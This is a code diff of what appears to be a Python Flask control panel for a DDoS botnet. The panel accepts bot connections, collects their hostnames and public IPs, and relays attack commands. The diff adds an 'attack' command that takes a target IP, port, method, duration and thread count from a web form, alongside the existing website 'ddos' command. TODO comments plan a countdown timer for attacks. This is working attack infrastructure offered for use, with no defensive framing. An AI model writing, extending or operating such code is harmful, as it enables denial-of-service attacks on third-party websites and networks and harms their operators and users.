@@ -16,7 +16,7 @@ from flask import *
 '''
 TODO Make grab system info get more info
 
-TODO Return more deatils about the ddos target (ip info and inputs used)
+TODO Make output box padding on left and right and top and bottom then height and width of box is automaticly set
 
 TODO Add a countdown timer to the page when attacking a website/IP
 
@@ -48,7 +48,7 @@ def print_debug(str):
 #endregion
 		
 # Server info
-ippp 	= "192.168.0.2"
+ippp 	= "192.168.0.22"
 port 	= 1888
 
 #region Variables
@@ -179,7 +179,6 @@ def collect():
 	hostname_list = []
 	public_ips = []
 	while not stop:
-		print_debug("Public IP's: " + str(public_ips))
 		try:
 			conn, address = sock.accept()
 			all_connections.append(conn)
@@ -288,6 +287,9 @@ def _take_cmd(bot, cmd):
 	
 	elif "ddos" in cmd:
 		return call_script(bot, cmd)
+
+	elif "attack" in cmd:
+		return call_script(bot, cmd)
 	
 
 
@@ -352,11 +354,19 @@ def command_check(command):
 		return (f'{command} {stress_time} {stress_amount}')
 
 	elif command == "ddos": 
-		ddos_method 	= request.form.get('ddos-method')
-		ddos_target 	= request.form.get('ddos-target')
-		ddos_time	 	= request.form.get('ddos-time')
-		ddos_thread 	= request.form.get('ddos-thread')
-		return (f'{command} {ddos_method} {ddos_target} {ddos_time} {ddos_thread}')
+		ddos_method 	= request.form.get('ddos-website-method')
+		ddos_target 	= request.form.get('ddos-website-target')
+		ddos_time	 	= request.form.get('ddos-website-time')
+		ddos_thread 	= request.form.get('ddos-website-thread')
+		return (f'{command} {ddos_method} {ddos_target} {ddos_thread} {ddos_time}')
+
+	elif command == "attack": 
+		ddos_method 	= request.form.get('ddos-ip-method')
+		ddos_target 	= request.form.get('ddos-ip-target')
+		ddos_port 		= request.form.get('ddos-ip-port')
+		ddos_time	 	= request.form.get('ddos-ip-time')
+		ddos_thread 	= request.form.get('ddos-ip-thread')
+		return (f'{command} {ddos_method} {ddos_target} {ddos_port} {ddos_thread} {ddos_time}')
 
 
 	else: return command
